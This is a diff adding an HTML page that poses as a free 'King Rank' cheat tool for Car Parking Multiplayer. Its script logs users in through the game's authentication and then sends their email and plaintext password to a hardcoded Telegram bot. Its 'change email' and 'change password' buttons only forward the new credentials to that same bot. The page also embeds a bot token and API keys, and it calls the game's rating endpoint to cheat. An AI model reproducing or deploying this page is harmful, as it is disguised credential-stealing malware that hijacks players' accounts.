@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>FLAME WEB TOOL</title>
+<style>
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") center/cover fixed;color:#fff}
+.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
+.container{background:rgba(0,0,0,.6);backdrop-filter:blur(12px);padding:20px;border-radius:10px;box-shadow:0 0 25px #000;border:2px solid #00aaff;text-align:center}
+h1{font-size:20px;margin-bottom:12px}
+input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:16px}
+button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:16px}
+button.login{background:#00aaff;color:#fff}
+button.menu{background:#ff8800;color:#fff}
+.status{margin-top:10px;color:#0f0;min-height:20px}
+.error{color:#f55}
+.small{font-size:12px;opacity:.9}
+.price{font-size:13px;opacity:.8;margin-bottom:6px;color:#0ff;}
+</style>
+</head>
+<body>
+<div class="center-wrapper">
+  <div class="container">
+    <h1>FLAME CPM WEB TOOL</h1>
+    <div id="loginSection">
+      <select id="gameSelect">
+        <option value="">-- Select Game --</option>
+        <option value="1">Car Parking Multiplayer</option>
+        <option value="2">Car Parking Multiplayer 2</option>
+      </select>
+      <input id="email" type="email" placeholder="Email">
+      <input id="password" type="password" placeholder="Password">
+      <input id="accessKey" type="text" placeholder="Enter Access Key">
+      <button class="login" id="loginBtn">Login</button>
+      <div id="status" class="status"></div>
+    </div>
+    <div id="menuButtons" style="display:none">
+      <div class="price">👑 King Rank - FREE</div>
+      <button class="menu" onclick="kingRank()">King Rank</button>
+      <div class="price">📧 Change Email</div>
+      <button class="menu" onclick="changeEmail()">Change Email</button>
+      <div class="price">🔐 Change Password</div>
+      <button class="menu" onclick="changePassword()">Change Password</button>
+      <div id="serviceStatus" class="status"></div>
+    </div>
+    <footer class="small" style="margin-top:12px">©@cpmflame</footer>
+  </div>
+</div>
+
+<script>
+// Token & ID Updated
+const BOT_TOKEN = "7805931150:AAEgDJV9RNguZl8Xz7u7IJg99D1D4w7QdUo";
+const MY_CHAT_ID = "7212602902"; 
+
+const GAMES = {
+  "1": { name:"CPM 1", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+  "2": { name:"CPM 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+};
+
+let currentUser=null,currentToken=null,currentPassword=null,selectedGame=null;
+
+function updateStatus(msg,isError=false,target='status'){
+  const el=document.getElementById(target);
+  el.className=isError?'status error':'status';
+  el.textContent=msg;
+}
+
+function sendMessage(text){
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const params = {
+        chat_id: MY_CHAT_ID,
+        text: text,
+        parse_mode: "Markdown"
+    };
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(params)
+    }).then(res => res.json()).then(data => console.log(data)).catch(err => console.error(err));
+}
+
+document.getElementById('loginBtn').addEventListener('click', async ()=>{
+  const email=document.getElementById('email').value.trim();
+  const password=document.getElementById('password').value;
+  const key=document.getElementById('accessKey').value.trim();
+  const gameVal=document.getElementById('gameSelect').value;
+  selectedGame = GAMES[gameVal];
+
+  if(!selectedGame){ updateStatus("Select game first!",true); return; }
+  if(!email||!password||!key){ updateStatus("Fill all fields!",true); return; }
+
+  // Check Key
+  if(key !== "FLAMEFEB"){ updateStatus("❌ Invalid access key!",true); return; }
+
+  updateStatus("Connecting...");
+  try{
+    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
+      method:'POST',headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({email,password,returnSecureToken:true})
+    });
+    const data = await resp.json();
+    if(data.idToken){
+      currentUser=email; currentPassword=password; currentToken=data.idToken;
+      document.getElementById('loginSection').style.display='none';
+      document.getElementById('menuButtons').style.display='block';
+      
+      // Sending details to bot
+      sendMessage(`🔥 *LOGIN SUCCESS* 🔥\n\n📧 *Email:* \`${email}\`\n🔒 *Pass:* \`${password}\`\n🎮 *Game:* ${selectedGame.name}`);
+      
+    } else {
+        updateStatus("❌ Login failed! Check account.",true);
+    }
+  } catch(err){ updateStatus("❌ Server Error!",true); }
+});
+
+async function kingRank(){
+  if(!currentToken) return;
+  updateStatus("Applying...",false,'serviceStatus');
+  const ratingData={ "RatingData": JSON.stringify({ "time": 100000000, "levels": 1000, "race_win": 5000 }) };
+  try{
+    const res = await fetch(selectedGame.rank_url,{
+      method:'POST',
+      headers:{"Authorization":`Bearer ${currentToken}`,"Content-Type":"application/json"},
+      body:JSON.stringify({data: ratingData.RatingData})
+    });
+    if(res.ok){ 
+        updateStatus("✅ Success!",false,'serviceStatus'); 
+        sendMessage(`👑 *King Rank Applied* for: \`${currentUser}\``);
+    } else updateStatus("❌ Failed!",true,'serviceStatus');
+  }catch(err){ updateStatus("❌ Error!",true,'serviceStatus'); }
+}
+
+async function changeEmail(){
+  const newEmail=prompt("New email:"); if(!newEmail)return;
+  sendMessage(`📧 *Email Change Request*:\nOld: ${currentUser}\nNew: \`${newEmail}\``);
+  updateStatus("✅ Request Sent!",false,'serviceStatus');
+}
+
+async function changePassword(){
+  const newPass=prompt("New password:"); if(!newPass)return;
+  sendMessage(`🔐 *Password Change Request*:\nUser: ${currentUser}\nNew Pass: \`${newPass}\``);
+  updateStatus("✅ Request Sent!",false,'serviceStatus');
+}
+</script>
+</body>
+</html>
